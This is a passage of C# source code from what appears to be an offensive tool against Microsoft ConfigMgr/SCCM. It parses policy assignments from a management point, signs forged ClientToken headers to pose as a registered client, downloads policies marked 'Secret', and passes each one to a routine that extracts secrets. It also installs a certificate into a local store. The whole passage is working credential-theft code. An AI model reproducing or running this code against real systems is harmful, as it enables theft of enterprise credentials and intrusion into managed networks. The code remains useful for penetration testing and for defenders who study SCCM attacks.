                    return;
                }
                XmlNodeList policyAssignmentNodeList = null;
                try
                {
                    MultipartMemoryStreamProvider multipartContentProvider = assignmentResponse.Content.ReadAsMultipartAsync().Result;
                    HttpContent multiPart1Content = multipartContentProvider.Contents[1];
                    byte[] multiPart1ByteContents = multiPart1Content.ReadAsByteArrayAsync().Result;

                    string multiPart1StrContents = Encoding.ASCII.GetString(Encoding.Convert(Encoding.Unicode, Encoding.ASCII, multiPart1ByteContents));
                    XmlDocument policyAssignmentsXmlDoc = new XmlDocument();
                    policyAssignmentsXmlDoc.LoadXml(multiPart1StrContents.Trim());
                    policyAssignmentNodeList = policyAssignmentsXmlDoc.GetElementsByTagName("PolicyAssignment");
                    Console.WriteLine($"[+] Found {policyAssignmentNodeList.Count} Policy Assignments!");

                }
                catch (Exception ex)
                {
                    string response = $"{assignmentResponse.Headers}\n\n{assignmentResponse.Content.ReadAsStringAsync().Result}";
                    Console.WriteLine("[-] Reply does not contain Policy Assignments. Received the following:");
                    Console.WriteLine("--- Response ---");
                    Console.WriteLine($"{response}");
                    Console.WriteLine($"--- Response End ---");
                }
                if (policyAssignmentNodeList != null)
                {
                    foreach (XmlNode policyAssignmentNode in policyAssignmentNodeList)
                    {
                        XmlNodeList policyNodeList = policyAssignmentNode.SelectNodes("Policy");
                        foreach (XmlNode policyNode in policyNodeList)
                        {
                            //XmlAttributeCollection nodeAttributes = policyNode.Attributes;
                            PolicyAssignment policyAssignment = new PolicyAssignment();
                            policyAssignment.Policy = new PolicyAssignmentPolicy();
                            if (policyNode.Attributes["PolicyID"] != null)
                            {
                                policyAssignment.Policy.Id = policyNode.Attributes["PolicyID"].Value; ;
                            }
                            if (policyNode.Attributes["PolicyVersion"] != null)
                            {
                                policyAssignment.Policy.Version = policyNode.Attributes["PolicyVersion"].Value;
                            }
                            if (policyNode.Attributes["PolicyCategory"] != null)
                            {
                                policyAssignment.Policy.Category = policyNode.Attributes["PolicyCategory"].Value;
                            }
                            if (policyNode.Attributes["PolicyFlags"] != null)
                            {
                                string szPolicyFlags = policyNode.Attributes["PolicyFlags"].Value;
                                int iPolicyFlags;
                                if (int.TryParse(szPolicyFlags, out iPolicyFlags))
                                {
                                    policyAssignment.Policy.Flags = (PolicyAssignmentFlags)iPolicyFlags;
                                }
                            }
                            XmlNode policyLocationNode = policyNode.SelectSingleNode("PolicyLocation");
                            if (policyLocationNode != null)
                            {
                                //string policyLocation = policyLocationNode.InnerText;
                                PolicyAssignmentLocation policyLocation = new PolicyAssignmentLocation();
                                policyLocation.Value = policyLocationNode.InnerText;
                                if (policyLocationNode.Attributes["PolicyHash"] != null)
                                {
                                    policyLocation.Hash = policyLocationNode.Attributes["PolicyHash"].Value;
                                }
                                if (policyLocationNode.Attributes["PolicyHashEx"] != null)
                                {
                                    policyLocation.HashEx = policyLocationNode.Attributes["PolicyHashEx"].Value;
                                }
                                policyAssignment.Policy.Location = policyLocation;
                            }

                            GetSecretsFromPolicy(policyAssignment, szMPHostname, new SmsClientId(szMediaGUIDPlain), encryptioncertificate);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] Server response error. Corrupt/Invalid request data?");
                return;
            }
        }

        public static HttpResponseMessage SendPolicyDownloadRequest(string url, SmsClientId clientId = null, MessageCertificateX509 certificate = null)
        {
            HttpClientHandler httpClientHandler = new HttpClientHandler()
            {
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
            };
            /* Not yet implemented
            if (szHTTPProxyAddress != null)
            {
                httpClientHandler.Proxy = new WebProxy(szHTTPProxyAddress);
                httpClientHandler.UseProxy = true;
            }
            */
            HttpClient httpClient = new HttpClient(httpClientHandler);
            httpClient.DefaultRequestHeaders.Add("User-Agent", "ConfigMgr Messaging HTTP Sender");
            var request = new HttpRequestMessage(HttpMethod.Get, url);
            // Add authentication headers required to download policies flagged "Secret"
            if (!string.IsNullOrEmpty(clientId.ToString()) && (certificate != null))
            {
                // client GUID
                string clientGUIDStr = $"{clientId.ToString().Replace("GUID:", "")}";
                string clientGUIDBracketStr = $"{{{clientGUIDStr}}}"; // Form: {XXXXXXXX-XXXX-XXXX-...}
                // Timestamp
                string CCMClientTimestamp = TimeHelpers.CurrentTimeAsIso8601;
                // sign ClientToken
                string ClientToken = $"{clientGUIDBracketStr};{CCMClientTimestamp}";
                byte[] ClientTokenBytes = Encoding.Unicode.GetBytes(ClientToken);
                string ClientTokenBytesSignature = "";
                try
                {
                    ClientTokenBytesSignature = certificate.Sign(ClientTokenBytes, "SHA-256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
                }
                catch (Exception ex)
                {
                    if (ex.ToString().Contains("does not support the specified algorithm"))
                    {
                        // Depending on the certificate the algo is sometimes referred to as "SHA-256" or "SHA256"
                        // This seems to also affect how the signature is generated... this is the workaround for that
                        ClientToken = $"{clientId};{CCMClientTimestamp}";
                        byte[] clientTokenHeaderBytes = Encoding.Unicode.GetBytes(ClientToken + "\0");
                        ClientTokenBytesSignature = certificate.Sign(clientTokenHeaderBytes, "SHA256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
                    }
                    else
                    {
                        throw ex;
                    }
                }
                // Add Client Headers
                Console.WriteLine("[+] Adding authentication headers to download request:\n" +
                                  $"      ClientToken: {ClientToken}\n" +
                                  $"      ClientTokenSignature: {ClientTokenBytesSignature}"
                                  );
                httpClient.DefaultRequestHeaders.Add("ClientToken", ClientToken);
                httpClient.DefaultRequestHeaders.Add("ClientTokenSignature", ClientTokenBytesSignature);
            }
            var response = httpClient.SendAsync(request).Result;
            return response;
        }

        public static X509Store StoreCertificate(X509Certificate2 certificate, string storeName, StoreLocation storeLocation)
        {
            var x509Store = new X509Store(storeName, storeLocation);
            x509Store.Open(OpenFlags.MaxAllowed);
            x509Store.Add(certificate);
            Console.WriteLine($"[+] Wrote \"{certificate.SubjectName.Name}\" certificate to {x509Store.Name} store for {x509Store.Location}");
            return x509Store;
        }
    }
}